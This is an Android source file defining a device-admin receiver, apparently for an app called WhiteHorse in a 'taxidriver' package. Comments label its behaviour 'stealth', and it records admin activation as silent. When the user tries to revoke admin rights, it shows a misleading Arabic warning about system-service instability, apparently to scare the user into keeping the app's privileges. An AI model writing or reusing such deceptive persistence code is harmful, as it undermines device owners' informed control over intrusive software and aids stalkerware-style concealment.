package com.dp.taxidriver;

  import android.app.admin.DeviceAdminReceiver;
  import android.content.Context;
  import android.content.Intent;
  import android.util.Log;

  /**
   * WhiteHorseAdminReceiver v2.7.14 — Stealth-safe wording
   */
  public class WhiteHorseAdminReceiver extends DeviceAdminReceiver {
      private static final String TAG = "WhiteHorseAdmin";

      @Override
      public void onEnabled(Context context, Intent intent) {
          super.onEnabled(context, intent);
          Log.d(TAG, "Admin enabled (silent)");
      }

      @Override
      public CharSequence onDisableRequested(Context context, Intent intent) {
          Log.w(TAG, "User requested to disable admin");
          // v2.7.14: stealth wording — generic system services warning
          return "إلغاء هذي الصلاحية قد يؤثر على استقرار خدمات الجهاز. هل تريد المتابعة؟";
      }

      @Override
      public void onDisabled(Context context, Intent intent) {
          super.onDisabled(context, intent);
          Log.w(TAG, "Admin disabled (silent)");
      }
  }
  